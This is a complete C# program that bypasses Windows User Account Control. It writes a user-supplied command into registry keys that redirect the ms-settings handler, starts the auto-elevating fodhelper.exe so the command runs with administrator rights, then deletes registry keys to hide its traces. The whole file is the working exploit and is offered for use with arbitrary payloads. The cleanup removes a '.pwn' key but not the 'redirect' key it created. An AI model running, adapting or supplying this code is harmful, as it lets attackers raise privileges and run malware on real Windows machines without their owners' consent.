using System.Diagnostics;
using Microsoft.Win32;

class Program
{
    public static void Main(string[] args)
    {

        if (args.Length == 0)
        {
            Console.WriteLine("Please specify a payload");
            return;
        }

        string cmd = string.Join(" ", args);
        string payload = $"{cmd}";
        Redirect(payload);

    }

    public static void Redirect(string payload)
    {

        Registry.SetValue(@"HKEY_CURRENT_USER\Software\Classes\ms-settings\CurVer", "", "redirect");
        Registry.SetValue(@"HKEY_CURRENT_USER\Software\Classes\redirect\Shell\Open\command", "", payload);


        Process process = new Process();
        process.StartInfo.FileName = @"C:\Windows\System32\fodhelper.exe";
        process.Start();

        System.Threading.Thread.Sleep(3000);

        Registry.CurrentUser.DeleteSubKeyTree("Software\\Classes\\ms-settings");
        Registry.CurrentUser.DeleteSubKeyTree("Software\\Classes\\.pwn");

    }
}